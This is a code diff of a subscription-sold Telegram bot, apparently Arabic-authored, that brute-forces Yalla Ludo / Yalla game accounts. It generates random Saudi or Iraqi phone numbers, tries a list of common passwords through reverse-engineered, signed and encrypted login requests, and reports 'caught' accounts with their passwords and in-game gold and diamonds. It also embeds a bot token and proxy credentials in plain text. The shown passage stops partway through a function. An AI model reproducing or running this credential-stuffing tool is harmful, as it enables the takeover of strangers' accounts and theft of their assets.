@@ -1,611 +1,498 @@
 import base64
 import hashlib
-import hmac as hmacmod
-import html
+import hmac as _hmac
 import json
 import os
 import random
-import string
-import struct
-import threading
+import sys
 import time
 import uuid
+import threading
 from concurrent.futures import ThreadPoolExecutor
-from typing import Any, Dict, List, Optional
-
 import requests
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_v1_5
 import telebot
-from telebot import types
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# === إعدادات البروكسي المدفوع الجديد ===
-def get_proxy():
-    """
-    إعدادات البروكسي المدفوع المخصص لضمان استقرار الاتصال.
-    """
-    return {
-        "http": "http://user0e9234bb:51e5211a276c@169.197.82.58:16645",
-        "https": "http://user0e9234bb:51e5211a276c@169.197.82.58:16645",
-    }
+# ==================== إعدادات التلغرام (معرفاتك والتوكن) ====================
+BOT_TOKEN = "8643610223:AAEao9Ibitaybb0iwRkDg-9K5h28b08JGYM"  # التوكن الجديد
+ADMIN_ID = 8795120325                                         # الآيدي الخاص بك (المطور)
+SUBS_FILE = "subscriptions.json"
 
-# === إعدادات البوت والمطور ==
-TG_TOKEN = "8643610223:AAEao9Ibitaybb0iwRkDg-9K5h28b08JGYM"
-ADMIN_ID = 8795120325  # آيدي المطور
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 
-bot = telebot.TeleBot(TG_TOKEN)
+# ==================== مفاتيح وثوابت النظام الأساسية ====================
+KEY_A = (
+    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1a2EqCh8Tqg31StFMA++MZz7u+IC"
+    "bOjZcavdG6obAhzxM4UJlJBNZ527KaVbkkEIR2QNf7V/ezpl5jRl5Z4B2KTwBXoIbHZG2qo6"
+    "Z7ZOKRCkdryuQbA7IRJxqb1H3EC4xmVk8PNNuHpnV8v99bzrvo4mYUv+9+35kfFg7QEW7bR7"
+    "de/cPsbXZ7xRwWSbYUBEU2wATW+mL36iWd72SFbvH4dXF1+db8EhKnYSkRZtou39eWfRLKcg"
+    "cAakaxK79R0V7mi/CcnG6+zFY2nn3S905dIgXIV2jn2QV7+dtFuxAY6vkCNgnyECyIlJo0Jk"
+    "9Ajl0WzrDn2VzLi6+dz0BP/ElwIDAQAB"
+)
+KEY_B = (
+    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkSNNnjBZ/aFYquwA2gIin8l9kS16"
+    "tPGcyHu7FWkTH3My/qBFG3mmD6Q/jdZW3kZ4eHyzISca02opHhyWc1ic/KCqHBLQiyR947Ln"
+    "H3N0u01mZdcdwSfKQ290Yep1YBRFgV/D2gVfxa9v1LihADR94qw5kpJbHo/CMqoXqrr4L8EN"
+    "KPztZOmuClg0SN9eJlXZSSxIuU2cwqd3eDwN3OyPCyUq2v5LIEK1gaKaeE7hlMuwUVB6ArNSo"
+    "5K8Mcx93OFJZkGdARB6UT+CaRuJAvv937tOH/2UHpWHP5nknk1aUU4mEaKRzzGR7rOR/Djbz"
+    "vhKI683YiEChw/LnWvKQFowbQIDAQAB"
+)
+SALT   = "$2b$04$1gzmpIl.6S1FuI7hMzWqDO"
+CHARS  = "ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678"
+URL    = "https://api.lightkvd.com/v1/account/login"
+APP_ID = "613687415143137"
 
-# === إعدادات البروتوكول والأمان المتقدمة ===
-version = '2.0'
-b1key   = b'4e82797b276c5cb729db62aaa229a057'
-b1iv    = b'0102030405060708'
-secret  = 'L3)qk*@8'
-api_url = "https://httpgateway.carrstuv.com/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
-ua      = "YallaLudo-1.5.0.0-(Build 1050003)-Android 32"
-
-kvals = [int(abs(__import__('math').sin(i+1)) * 2**32) & 0xffffffff for i in range(64)]
-shift = [7,12,17,22]*4 + [5,9,14,20]*4 + [4,11,16,23]*4 + [6,10,15,21]*4
-ivrev = (0x10325476, 0x98badcfe, 0xefcdab89, 0x67452301)
-
-# تخزين جلسات المشتركين بشكل مستقل تماماً
-user_sessions: Dict[int, Dict[str, Any]] = {}
-scan_threads = 20  # السرعة الافتراضية للثريدز
-
-# تخزين المشتركين: {user_id: expiry_timestamp}
-subscribers: Dict[int, float] = {}
-user_states: Dict[int, str] = {}
-
-profile_path  = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
-profile_hosts = [
-    "https://httpgateway.carrstuv.com",
-    "https://httpgateway.planecde.com",
-    "https://httpgateway.lampjkl.com",
-    "https://httpgateway.funcdeg.com",
-    "https://httpgateway.yalla.games",
+DEVS   = [
+    ("OnePlus 9 Pro",      "LE2123"),    ("Samsung Galaxy S21", "SM-G991B"),
+    ("Xiaomi Mi 11",       "M2011K2G"), ("Realme GT",           "RMX2202"),
+    ("Oppo Reno 6",        "CPH2235"),  ("Vivo X60 Pro",        "V2046"),
+    ("Samsung Galaxy A52", "SM-A525F"), ("Oppo A96",            "CPH2469"),
+    ("Infinix Hot 20",     "X6826"),    ("Tecno Spark 10",      "KI5q"),
 ]
 
-# === دوال التشفير والتوقيع المتقدمة ===
-def md5raw(msg, iv):
-    a0, b0, c0, d0 = iv
-    length = len(msg) * 8
-    m = msg + b'\x80'
-    while len(m) % 64 != 56:
-        m += b'\x00'
-    m += struct.pack('<Q', length)
-    for ch in range(0, len(m), 64):
-        block = struct.unpack('<16I', m[ch:ch+64])
-        a, b, c, d = a0, b0, c0, d0
-        for i in range(64):
-            if   i < 16: f = (b & c) | (~b & d); g = i
-            elif i < 32: f = (d & b) | (~d & c); g = (5*i+1) % 16
-            elif i < 48: f = b ^ c ^ d;           g = (3*i+5) % 16
-            else:        f = c ^ (b | ~d);         g = (7*i)   % 16
-            f = (f + a + kvals[i] + block[g]) & 0xffffffff
-            a = d; d = c; c = b
-            b = (b + ((f << shift[i]) | (f >> (32-shift[i])))) & 0xffffffff
-        a0=(a0+a)&0xffffffff; b0=(b0+b)&0xffffffff
-        c0=(c0+c)&0xffffffff; d0=(d0+d)&0xffffffff
-    return struct.pack('<4I', a0, b0, c0, d0)
+CODES  = {
+    30052: ("NOT_REGISTERED", "Phone not registered"),
+    30101: ("WRONG_PASSWORD", "Wrong password"),
+    30107: ("VALID",          "Password correct — new device, SMS verify needed"),
+    30201: ("RATE_LIMITED",   "Too many attempts — rate limited"),
+}
 
-def md5r(msg):
-    return md5raw(msg, ivrev).hex()
+DEFAULT_PASSWORDS = [
+    'Aa123123123',
+    'Aa12312300',
+    'Aa10002000',
+    'Aa100200300',
+    'Aa100200',
+    'Aa10203040',
+    'Aa102030',
+    'As123123',
+    'Aa11223344',
+    'Aa123456',
+    'Aa12345678',
+    'Ali112233',
+    'Aa123456789',
+    'Ali100200',
+    'Ali20002000',
+    'Ahmed100200',
+    'Ahmad123123',
+    'qwer1234',
+    'qwer4321',
+    'q1w2e3r4',
+    '1q2w3e4r',
+]
 
-def md5s(msg):
-    return hashlib.md5(msg).hexdigest()
+# دالة الجلسات لكل خيط لضمان السرعة ومنع تداخل الاتصالات
+thread_local = threading.local()
 
-def md5upper(text):
-    return hashlib.md5(text.encode('utf-8')).hexdigest().upper()
+def get_session():
+    if not hasattr(thread_local, "session"):
+        thread_local.session = requests.Session()
+    return thread_local.session
 
-def encrypt_data(data, hera):
-    k  = md5r(hera.encode() + secret.encode()).encode()
-    ks = (k * (len(data) // len(k) + 1))[:len(data)]
-    return base64.b64encode(bytes(a ^ b for a, b in zip(data, ks))).decode()
+# دوال التشفير الأساسية الخاصة بك
+rsa_enc = lambda t, k: base64.b64encode(
+    PKCS1_v1_5.new(
+        RSA.import_key(f"-----BEGIN PUBLIC KEY-----\n{k}\n-----END PUBLIC KEY-----")
+    ).encrypt(t.encode("utf-8"))
+).decode()
 
-def sign_data(data, hera):
-    key = md5r(hera.encode() + secret.encode()).encode()
-    return hmacmod.new(key, data, hashlib.sha256).hexdigest()
+md5h    = lambda s: hashlib.md5(s.encode("utf-8")).hexdigest()
+sha2h   = lambda s: hashlib.sha256(s.encode("utf-8")).hexdigest()
+phash   = lambda pw: md5h(sha2h(pw) + SALT)
+rstr    = lambda n=6: "".join(random.choice(CHARS) for _ in range(n))
+prms    = lambda d: "&".join(f"{k}={v}" for k, v in sorted(d.items()))
+clrp    = lambda p: p.strip().replace(" ", "").lstrip("0")
+rdev    = lambda: random.choice(DEVS)
+icon_of = lambda s: {"VALID": "✅", "NOT_REGISTERED": "🚫", "RATE_LIMITED": "⏳",
+                     "ERROR": "⚠️", "WRONG_PASSWORD": "❌"}.get(s, "❓")
 
-def medusa(data, hera):
-    pt = f'{md5s(data)}-{len(data)}-{md5r(hera.encode() + secret.encode())}-{secret}'
-    ct = AES.new(b1key, AES.MODE_CBC, b1iv).encrypt(pad(pt.encode(), 16))
-    return base64.b64encode(ct).decode()
-
-def gendevice():
-    device  = str(uuid.uuid4())
-    android = f'{uuid.uuid4().hex}_{uuid.uuid4().hex[:16]}'
-    chars   = string.ascii_letters + string.digits
-    shumeng = ''.join(random.choice(chars) for _ in range(36))
-    nonce   = f'{random.randint(-2**31, 2**31 - 1)}_{uuid.uuid4()}'
-    return device, android, shumeng, nonce
-
-def baggage(timestamp, device, android, shumeng, nonce, country="SA"):
-    obj = {
-        "timeSpan": timestamp, "version": "1.5.1.0",
-        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
-        "deviceType": 2, "downloadChannelId": 1,
-        "shuMengId": shumeng, "nonce": nonce,
-        "plateType": 0, "LanguageId": 2, "phoneModel": "SM-S918B",
-        "X-Phone-Country": country, "X-Sim-Country": country,
-        "AndroidId": android, "appType": 0,
-    }
-    return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()
-
-def buildrequest(body, country="SA"):
-    device, android, shumeng, nonce = gendevice()
-    now    = int(time.time() * 1000)
-    hera   = uuid.uuid4().hex
-    bag    = baggage(str(now), device, android, shumeng, nonce, country)
-    endpoint = '/' + '/'.join(api_url.split('/')[3:])
-    signed = (endpoint + '' + ua + bag).encode('utf-8')
-
-    xsign   = f'{version}_2_{sign_data(signed, hera)}'
-    xmedusa = medusa(signed, hera)
-
-    wire = json.dumps(
-        {"paramJsonString": encrypt_data(body, hera)},
-        separators=(',',':')
-    ).encode('utf-8')
-
-    headers = {
-        'User-Agent': ua,
-        'UserId': '0',
-        'X-App-Id': 'ludo',
-        'X-Baggage': bag,
-        'X-Access-Token': '',
-        'X-Timestamp': str(now),
-        'versionString': '1.5.1.0',
-        'X-Sign': xsign,
-        'X-Hera': hera,
-        'X-Time': str(now),
-        'X-Medusa': xmedusa,
-        'Content-Type': 'application/json; charset=utf-8',
-    }
-    return headers, wire, hera, device, android, shumeng, nonce
-
-def build_payload(mobile, password, country="SA"):
-    device, android, shumeng, nonce = gendevice()
-    area_code = "966"
-    
-    data = {
-        "mobile": mobile, "areaCode": area_code, "password": password,
-        "languageId": 2, "nationalityId": "1",
-        "hostConfig": [
-            {"bizType":5000,"countryCode":country,"hostUrl":"https://api-shumeng.yalla.games","type":2,"version":4},
-            {"bizType":5001,"countryCode":"","hostUrl":"ws://firebreak.yalla.games","type":1,"version":1},
-            {"bizType":1006,"countryCode":country,"hostUrl":"https://httpgateway.foodjkl.com,https://httpgateway.planecde.com,https://httpgateway.carrstuv.com","type":2,"version":20},
-            {"bizType":1000,"countryCode":country,"hostUrl":"https://account.foodjkl.com,https://account.yalla.games,https://account.carrstuv.com","type":2,"version":19},
-        ],
-        "simCountry": country, "version": "1.5.1.0",
-        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
-        "deviceType": 2, "downloadChannelId": 1,
-        "shuMengId": shumeng, "nonce": nonce,
-        "plateType": 0, "phoneModel": "SM-S918B",
-        "X-Phone-Country": country, "X-Sim-Country": country,
-        "AndroidId": android, "IsSubpackages": 0, "appType": 0, "idfa": "",
-    }
-    body_bytes = json.dumps(data, separators=(',',':'), ensure_ascii=False).encode('utf-8')
-    headers, wire, hera, _, _, _, _ = buildrequest(body_bytes, country)
-    return headers, wire, hera
-
-def decode_resp(resp, hera=None):
-    xorkey = bytes.fromhex("3336613636313637666532623236633033363933663061643936653462613439")
-    param  = resp.get("paramJsonString", "")
-    if not param:
-        return resp
-    raw = base64.b64decode(param)
-    try:
-        xored = bytes(v ^ xorkey[i % len(xorkey)] for i, v in enumerate(raw))
-        return json.loads(xored.decode('utf-8'))
-    except Exception:
-        pass
-    if hera:
+# ==================== نظام إدارة الاشتراكات ====================
+def load_subscriptions() -> dict:
+    if os.path.exists(SUBS_FILE):
         try:
-            k  = md5r(hera.encode() + secret.encode()).encode()
-            ks = (k * (len(raw) // len(k) + 1))[:len(raw)]
-            dec = bytes(a ^ b for a, b in zip(raw, ks))
-            return json.loads(dec.decode('utf-8'))
+            with open(SUBS_FILE, "r", encoding="utf-8") as f:
+                return json.load(f)
         except Exception:
-            pass
-    return resp
+            return {}
+    return {}
 
-def profile_baggage(timestamp, token, hera, country="SA"):
-    device, android, shumeng, _ = gendevice()
-    nc      = f'{random.randint(0, 2**31-1)}_{uuid.uuid4()}'
-    key_hex = md5r(hera.encode() + secret.encode())
-    bsign   = hashlib.md5((key_hex + nc).encode()).hexdigest().upper()
-    obj = {
-        "token": token, "sign": bsign,
-        "timeSpan": timestamp, "version": "1.5.1.0",
-        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
-        "deviceType": 2, "downloadChannelId": 1,
-        "shuMengId": shumeng, "nonce": nc,
-        "plateType": 0, "LanguageId": 2, "phoneModel": "SM-S918B",
-        "X-Phone-Country": country, "X-Sim-Country": country,
-        "AndroidId": android, "appType": 0,
-    }
-    return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()
+def save_subscriptions(subs: dict):
+    with open(SUBS_FILE, "w", encoding="utf-8") as f:
+        json.dump(subs, f, ensure_ascii=False, indent=4)
 
-def fetch_profile(session_req, token, user_id, login_data=None, country="SA"):
-    uid  = int(user_id) if str(user_id).isdigit() else user_id
-    srvs = []
-    for hc in ((login_data or {}).get('hostConfig') or []):
-        if hc.get('bizType') == 1006 and hc.get('hostUrl'):
-            for u in hc['hostUrl'].split(','):
-                u = u.strip().rstrip('/')
-                if u and u not in srvs: srvs.append(u)
-            break
-    for s in profile_hosts:
-        if s not in srvs: srvs.append(s)
-    for srv in srvs:
-        now    = int(time.time() * 1000)
-        hera   = uuid.uuid4().hex
-        bag    = profile_baggage(str(now), token, hera, country)
-        signed = (profile_path + token + ua + bag).encode('utf-8')
-        body   = json.dumps({'accountId': uid}, separators=(',',':')).encode('utf-8')
-        wire   = json.dumps({"paramJsonString": encrypt_data(body, hera)}, separators=(',',':')).encode('utf-8')
-        hdrs   = {
-            'User-Agent': ua, 'UserId': str(user_id), 'X-App-Id': 'ludo',
-            'X-Baggage': bag, 'X-Access-Token': token,
-            'X-Timestamp': str(now), 'versionString': '1.5.1.0',
-            'X-Sign': f'{version}_2_{sign_data(signed, hera)}',
-            'X-Hera': hera, 'X-Time': str(now),
-            'X-Medusa': medusa(signed, hera),
-            'Content-Type': 'application/json; charset=utf-8',
-        }
-        try:
-            r   = session_req.post(srv + profile_path, data=wire, headers=hdrs, proxies=get_proxy(), timeout=8)
-            obj = decode_resp(r.json(), hera)
-            if obj.get('status') == 0:
-                data = obj.get('data') or {}
-                base = data.get('baseInfo') or data
-                if base.get('goldNum') is not None or base.get('diamondNum') is not None:
-                    return data
-        except Exception:
-            continue
-    return None
-
-def format_hit_message(data, mobile, password, country, prof):
-    raw_name = data.get('name') or data.get('nickName', '—')
-    name = html.escape(str(raw_name))
-    
-    area_prefix = "+966"
-    country_label = "السعودية 🇸🇦"
-
-    lines = [
-        "<b>تم صيد حساب جديد 🎯</b>",
-        f"<b>الدولة :</b> {country_label}",
-        f"<b>رقم الهاتف :</b> <code>{area_prefix}{mobile}</code>",
-        f"<b>كلمة المرور :</b> <code>{password}</code>",
-        f"<b>الاسم :</b> {name}",
-    ]
-
-    if prof:
-        base  = prof.get('baseInfo') or prof
-        game  = prof.get('gameInfo') or {}
-        meds  = prof.get('medalCountInfo') or {}
-        gold  = base.get('goldNum',         '—')
-        dia   = base.get('diamondNum',       '—')
-        frz   = '🔴 مبند (Banned)' if base.get('freezeStatus') else '🟢 نشط (Active)'
-
-        lines.extend([
-            f"<b>عدد الذهب :</b> {gold}",
-            f"<b>عدد جواهر :</b> {dia}",
-            f"<b>حالة الحساب :</b> {frz}",
-        ])
-    else:
-        lines.append("⚠️ <i>الحساب طالب تحقق</i>")
-
-    lines.append("\nBy - @aboodriad")
-    return "\n".join(lines)
-
-def generate_saudi_number() -> str:
-    prefixes = ["50", "53", "54", "55", "56", "57", "58", "59"]
-    return random.choice(prefixes) + "".join(str(random.randint(0, 9)) for _ in range(7))
-
-def check_subscription(user_id: int) -> bool:
+def is_user_active(user_id: int) -> bool:
     if user_id == ADMIN_ID:
         return True
-    if user_id in subscribers:
-        if time.time() < subscribers[user_id]:
+    subs = load_subscriptions()
+    str_uid = str(user_id)
+    if str_uid in subs:
+        if time.time() < subs[str_uid]:
             return True
-        else:
-            del subscribers[user_id]
     return False
 
-def get_user_session(user_id: int) -> Dict[str, Any]:
-    if user_id not in user_sessions:
-        user_sessions[user_id] = {
-            "is_running": False,
-            "stop_event": threading.Event(),
-            "thread": None,
-            "valid_count": 0,
-            "wrong_count": 0,
-            "error_count": 0,
-            "tried": set(),
-            "stats_lock": threading.Lock()
-        }
-    return user_sessions[user_id]
+# قاموس لتتبع حالة الفحص الخاصة بكل مستخدم بشكل مستقل تماماً
+user_active_scans: dict = {}
 
-def get_control_keyboard(user_id: int):
-    session = get_user_session(user_id)
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    if not session["is_running"]:
-        markup.add(types.InlineKeyboardButton("▶ بدء الفحص (السعودية فقط 🇸🇦)", callback_data="start_check"))
-    else:
-        markup.add(types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check"))
+# ==================== دالة تسجيل الدخول (LightKVD) ====================
+def _do_login(phone: str, pw: str, region: int = 964, timeout: int = 20) -> dict:
+    session = get_session()
+    dname, model = rdev()
+    _uid     = str(uuid.uuid4())
+    _cleaned = clrp(phone)
+    _osv     = str(random.randint(28, 33))
+    _ts      = str(int(time.time() * 1000))
+    _nc      = rstr(6)
+    _n       = rstr(6)
     
-    markup.add(
-        types.InlineKeyboardButton("➕ تفعيل مشترك", callback_data="add_subscriber"),
-        types.InlineKeyboardButton("➖ حذف مشترك", callback_data="del_subscriber"),
-        types.InlineKeyboardButton("📋 عرض المشتركين", callback_data="list_subscribers"),
-        types.InlineKeyboardButton("📢 إذاعة للمشتركين", callback_data="broadcast_msg"),
-        types.InlineKeyboardButton(f"⚙️ سرعة الفحص (الثريدز): {scan_threads}", callback_data="set_threads")
-    )
-    return markup
-
-def get_user_keyboard(user_id: int):
-    session = get_user_session(user_id)
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    if not session["is_running"]:
-        markup.add(types.InlineKeyboardButton("▶ بدء الفحص (السعودية فقط 🇸🇦)", callback_data="start_check"))
-    else:
-        markup.add(types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check"))
-    return markup
-
-@bot.message_handler(commands=['start'])
-def start_command(message):
-    user_id = message.from_user.id
-    session = get_user_session(user_id)
-    if user_id == ADMIN_ID:
-        bot.reply_to(message, "أهلاً بك يا مطور البوت 👨‍💻\nاستخدم الأمر /admin للتحكم.")
-        return
+    _body    = {
+        "equipment_model": model,  "os_version":     _osv,
+        "equipment_type":  model,  "device_name":    model,
+        "phone_num":       rsa_enc(_cleaned, KEY_B),
+        "region_telcode":  region,  "acc_password":   phash(pw),
+        "app_id":          APP_ID,  "device_type":    1,
+        "device_no":       rsa_enc(_uid, KEY_B),
+        "redirect_uri":    "https://www.yallaludo.com/",
+        "acc_language":    1,
+    }
+    _can = f"biz_content={{{prms(_body)}}}&nonce={_nc}&timestamp={_ts}"
+    _sn  = base64.b64encode(
+        _hmac.new(_n.encode(), md5h(_can).encode(), hashlib.sha256)
+        .hexdigest().encode()
+    ).decode()
+    _sk  = rsa_enc(_n, KEY_A)
     
-    if check_subscription(user_id):
-        expiry = subscribers.get(user_id, 0)
-        rem_days = int((expiry - time.time()) / 86400) if expiry > time.time() else 0
-        text = (
-            f"👋 <b>أهلاً بك عزيزي المشترك في بوت فحص يالا لودو.</b>\n\n"
-            f"✅ اشتراكك <b>نشط</b>\n"
-            f"⏳ الفترة المتبقية: حوالي {rem_days} يوم\n"
-            f"🌐 وضع الفحص: <b>السعودية فقط 🇸🇦</b>\n"
-            f"حالة الفحص الخاص بك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n\n"
-            "تحكم بالفحص عبر الأزرار أدناه:"
+    _hdrs = {
+        "User-Agent": (
+            f"Mozilla/5.0 (Linux; Android {_osv}; {model}) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36"
+        ),
+        "Accept":           "application/json, text/plain, */*",
+        "sn":               _sn,
+        "sk":               _sk,
+        "acc_language":     "2",  "app_platform":     "3",
+        "sdk_version":      "1.1.1", "open_version":  "1.1.1",
+        "sdk-version":      "1.1.1", "web-version":   "1.0.0",
+        "content-type":     "application/json;charset=UTF-8",
+        "platform":         "1",
+        "origin":           "https://api.lightkvd.com",
+        "x-requested-with": "com.yalla.yallagames",
+        "referer":          "https://api.lightkvd.com/login",
+        "accept-language":  "ar-SA,ar;q=0.9,en-US;q=0.8,en;q=0.7",
+        "Cookie":           f"cna={uuid.uuid4().hex[:16]}",
+    }
+    
+    try:
+        _rr = session.post(
+            URL,
+            params={"timestamp": _ts, "nonce": _nc},
+            data=json.dumps(_body),
+            headers=_hdrs,
+            timeout=timeout,
         )
-        bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_user_keyboard(user_id))
-    else:
-        bot.reply_to(message, "❌ <b>عذراً، لست مسجلاً أو انتهى اشتراكك.</b>\n\nيرجى التواصل مع المطور لتفعيل حسابك.", parse_mode="HTML")
+        _j    = _rr.json() if _rr.content else None
+        _code = _j.get("code") if _j else None
+        
+        if _code in CODES:
+            return {"status": CODES[_code][0], "code": _code, "message": CODES[_code][1], "dev": {"name": dname, "model": model}}
+        elif _code in (0, None) and _j and _j.get("data"):
+            return {"status": "VALID", "code": _code, "message": "Full login success", "data": _j.get("data"), "dev": {"name": dname, "model": model}}
+        elif _j is None:
+            return {"status": "ERROR", "message": f"HTTP {_rr.status_code} non-JSON", "dev": {"name": dname, "model": model}}
+        else:
+            return {"status": "UNKNOWN", "code": _code, "message": _j.get("message", "")[:80], "dev": {"name": dname, "model": model}}
+    except Exception as e:
+        return {"status": "ERROR", "message": str(e), "dev": {"name": dname, "model": model}}
 
-@bot.message_handler(commands=['admin'])
-def admin_command(message):
-    if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ عذراً، هذا الأمر للمطور فقط.")
-        return
+def generate_random_phone():
+    prefixes = ["771", "770", "781", "777"]
+    return random.choice(prefixes) + "".join([str(random.randint(0, 7)) for _ in range(7)])
+
+# ==================== واجهات الأزرار (Keyboards) ====================
+def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("بدء الفحص", callback_data="start_scan"))
+    markup.add(InlineKeyboardButton("تفاصيل الاشتراك", callback_data="my_sub"))
+    if user_id == ADMIN_ID:
+        markup.add(InlineKeyboardButton("اعدادات البوت", callback_data="admin_panel"))
+    return markup
+
+def get_scanning_keyboard() -> InlineKeyboardMarkup:
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("ايقاف الفحص", callback_data="stop_scan"))
+    return markup
+
+def get_admin_keyboard() -> InlineKeyboardMarkup:
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("تفعيل مشترك", callback_data="admin_add"))
+    markup.add(InlineKeyboardButton("حذف مشترك", callback_data="admin_del"))
+    markup.add(InlineKeyboardButton("المشتركين الكلي", callback_data="admin_list"))
+    markup.add(InlineKeyboardButton("رجوع", callback_data="main_menu"))
+    return markup
+
+# ==================== معالجة أوامر التلغرام ====================
+@bot.message_handler(commands=['start'])
+def cmd_start(message):
     user_id = message.from_user.id
-    session = get_user_session(user_id)
-    text = (
-        "🎛 <b>لوحة تحكم المطور الرئيسية</b>\n\n"
-        f"حالة الفحص لديك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n"
-        f"وضع الفحص: <b>السعودية فقط 🇸🇦</b>\n"
-        f"سرعة الفحص العامة: <b>{scan_threads} ثريد</b>\n\n"
-        "اختر أحد خيارات الإدارة أدناه:"
+    if not is_user_active(user_id):
+        bot.reply_to(message, "انت غير مشترك راسل المطور @aboodriad")
+        return
+    
+    welcome_text = (
+        "<b>مرحبا بك عزيزي\nلوحة المشترك الخاصة\nاختصاص فحص حسابات يلا شات داخلي\n\nقم بتشغيل البوت من خلال بدء الفحص</b>"
     )
-    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_control_keyboard(user_id))
+    bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id))
 
 @bot.callback_query_handler(func=lambda call: True)
-def callback_handler(call):
+def handle_callbacks(call):
     user_id = call.from_user.id
-    is_admin = (user_id == ADMIN_ID)
-    session = get_user_session(user_id)
+    chat_id = call.message.chat.id
+    message_id = call.message.message_id
 
-    if not is_admin and not check_subscription(user_id):
-        bot.answer_callback_query(call.id, "❌ عذراً، انتهى اشتراكك أو ليس لديك صلاحية!", show_alert=True)
+    if not is_user_active(user_id) and call.data != "my_sub":
+        try:
+            bot.answer_callback_query(call.id, "الاشتراك منتهي (:", show_alert=True)
+        except Exception:
+            pass
         return
 
-    if call.data == "start_check":
-        if session["is_running"]:
-            bot.answer_callback_query(call.id, "⚠️ الفحص يعمل لديك بالفعل!")
-            return
+    if call.data == "main_menu":
+        if user_id in user_active_scans:
+            user_active_scans[user_id]["running"] = False
+        try:
+            bot.edit_message_text("<b>مرحبا بك عزيزي\nلوحة المشترك الخاصة\nاختصاص فحص حسابات يلا شات داخلي\n\nقم بتشغيل البوت من خلال بدء الفحص</b>", chat_id, message_id, reply_markup=get_main_keyboard(user_id))
+        except Exception:
+            pass
+
+    elif call.data == "my_sub":
+        subs = load_subscriptions()
+        str_uid = str(user_id)
+        if user_id == ADMIN_ID:
+            sub_status = "انت مدير البوت"
+        elif str_uid in subs and time.time() < subs[str_uid]:
+            rem_days = int((subs[str_uid] - time.time()) / 86400)
+            sub_status = f"الاشتراك الخاص بك : {rem_days}"
+        else:
+            sub_status = "غير فعال ❌"
         
-        session["is_running"] = True
-        session["stop_event"].clear()
-        session["valid_count"] = 0
-        session["wrong_count"] = 0
-        session["error_count"] = 0
-        session["tried"].clear()
+        text = f"<b>معلومات حسابك :</b>\nالآيدي : <code>{user_id}</code>\n📌 الحالة : {sub_status}"
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("رجوع", callback_data="main_menu"))
+        try:
+            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
+        except Exception:
+            pass
 
-        t = threading.Thread(target=run_checker_loop, args=(call.message.chat.id, user_id, call.message.message_id))
-        t.daemon = True
-        t.start()
-        session["thread"] = t
-
-        bot.answer_callback_query(call.id, "✅ تم بدء الفحص بالبروكسي المدفوع (السعودية 🇸🇦)")
-        markup = get_control_keyboard(user_id) if is_admin else get_user_keyboard(user_id)
-        bot.edit_message_text(
-            f"🚀 <b>جاري فحص حسابات السعودية 🇸🇦 بالبروكسي المدفوع...</b>\n\n"
-            f"✅ صيد (Valid): {session['valid_count']}\n"
-            f"❌ خطأ (Wrong): {session['wrong_count']}\n"
-            f"⚠️ أخطاء اتصال (Errors): {session['error_count']}",
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            parse_mode="HTML",
-            reply_markup=markup
-        )
-
-    elif call.data == "stop_check":
-        if not session["is_running"]:
-            bot.answer_callback_query(call.id, "⚠️ الفحص متوقف لديك مسبقاً!")
-            return
-        session["is_running"] = False
-        session["stop_event"].set()
-        bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص")
-        main_text = (
-            f"🌐 <b>لوحة الفحص (متوقف 🛑)</b>\n\n"
-            f"📊 <b>ملخص النتائج النهائية:</b>\n"
-            f"✅ صيد (Valid): {session['valid_count']}\n"
-            f"❌ خطأ (Wrong): {session['wrong_count']}\n"
-            f"⚠️ أخطاء اتصال (Errors): {session['error_count']}\n\n"
-            "اختر أحد الخيارات أدناه:"
-        )
-        markup = get_control_keyboard(user_id) if is_admin else get_user_keyboard(user_id)
-        bot.edit_message_text(main_text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML", reply_markup=markup)
-
-    elif call.data in ["add_subscriber", "del_subscriber", "list_subscribers", "broadcast_msg", "set_threads"] and is_admin:
-        if call.data == "add_subscriber":
-            user_states[user_id] = "add_subscriber"
-            bot.answer_callback_query(call.id)
-            bot.send_message(call.message.chat.id, "أرسل ايدي الشخص وعدد الأيام بالتنسيق:\nمثال: <code>123456789 30</code>", parse_mode="HTML")
-        elif call.data == "del_subscriber":
-            user_states[user_id] = "del_subscriber"
-            bot.answer_callback_query(call.id)
-            bot.send_message(call.message.chat.id, "أرسل ايدي الشخص المراد حذفه:")
-        elif call.data == "list_subscribers":
-            bot.answer_callback_query(call.id)
-            if not subscribers:
-                bot.send_message(call.message.chat.id, "📋 لا يوجد مشتركين حالياً.")
-            else:
-                now = time.time()
-                subs_text = "📋 <b>قائمة المشتركين:</b>\n\n"
